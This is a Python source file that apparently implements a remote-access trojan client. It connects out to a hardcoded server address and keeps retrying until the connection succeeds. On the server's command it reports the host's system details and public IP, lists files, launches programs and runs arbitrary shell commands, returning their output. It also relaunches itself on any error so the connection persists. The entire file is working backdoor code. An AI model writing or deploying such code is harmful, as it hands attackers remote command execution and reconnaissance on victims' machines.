#modules: sys, socket, os
import socket
from platform import system, release, version, machine
from requests import get
import json
import threading
import os
from sys import executable, argv
import subprocess

ip_server = "192.168.43.187"
port_server = 1234
system_info = {}

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def handle_connection():
    while True:
        try:
            sock.connect((ip_server, port_server))
            break
        except:
            continue

def send_system_info():
    system_info["platform"] =  system()
    system_info['platform-release']= release()
    system_info['platform-version']= version()
    system_info['architecture']= machine()
    system_info['hostname']= socket.gethostname()
    system_info["public_ip"] = get('https://api.ipify.org').text
    
    json_sys = json.dumps(system_info)
    sock.send(bytes(json_sys, "utf-8"))

def wait_command():
    while True:
        try:
            command = sock.recv(1024).decode("utf-8")
            array_command = command.split(" ")
            if command == "get_info":
                send_system_info()
            elif command == "list":
                data = str(os.listdir("."))
                sock.send(bytes(data, "utf-8"))
            elif command == "cmd":
                command = sock.recv(1024).decode("utf-8")
                print(command)
            elif array_command[0] == "start":
                subprocess.call(array_command[1])
            elif array_command[0] == "input":
                 proc = subprocess.Popen(array_command[1:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 output = proc.stdout.read() + proc.stderr.read()
                 sock.send(output)
        except:
            python = executable
            os.execl(python, python, * argv)


if __name__ == "__main__":
    func_1 = threading.Thread(target=wait_command)
    
    handle_connection()
    func_1.start()